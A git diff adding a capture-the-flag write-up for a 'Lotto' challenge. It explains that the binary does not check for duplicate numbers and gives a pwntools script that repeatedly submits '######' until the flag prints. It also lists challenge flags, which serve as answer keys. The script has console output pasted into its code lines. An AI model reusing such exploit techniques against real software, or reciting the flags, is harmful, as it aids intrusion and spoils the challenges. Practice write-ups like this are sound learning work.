@@ -247,3 +247,46 @@ only if I knew CVE-2014-6271 ten years ago..!!
 ```
 
 ``` Flag : only if I knew CVE-2014-6271 ten years ago..!! ```
+
+# Lotto
+```C
+int match = 0, j = 0;
+	for(i=0; i<6; i++){
+		for(j=0; j<6; j++){
+			if(lotto[i] == submit[j]){
+				match++;
+			}
+		}
+	}
+```
+this code will compare our 6 characters to each character in lotto, so if lotto was equal ```!"#$%&,``` and we enter ```######``` we got the flag.
+<br>
+but we have to exactly get ```match``` variable value equal  to 6 
+<br>
+so run the binary using the same input until you got the flag, and as the help menu says
+```assembly
+- nLotto Rule -
+nlotto is consisted with 6 random natural numbers less than 46
+...
+```
+make it less than ```46```
+
+i used pwntools to get the flag.
+```python
+from pwn import *
+proc = process("./lotto")
+Starting local process './lotto'
+Starting local process './lotto': Done
+proc.recv()
+while True:
+   proc.sendline("1")
+   proc.sendline("######")
+   a = proc.recv()
+   if "mom" in a:
+      print(a)
+      break
+```
+![screenshot at 2018-07-13 17-21-32](https://user-images.githubusercontent.com/22657154/42700778-6a396a68-86cd-11e8-89be-513db652bcc9.png)
+
+```Flag : sorry mom... I FORGOT to check duplicate numbers... :( ```
+ 
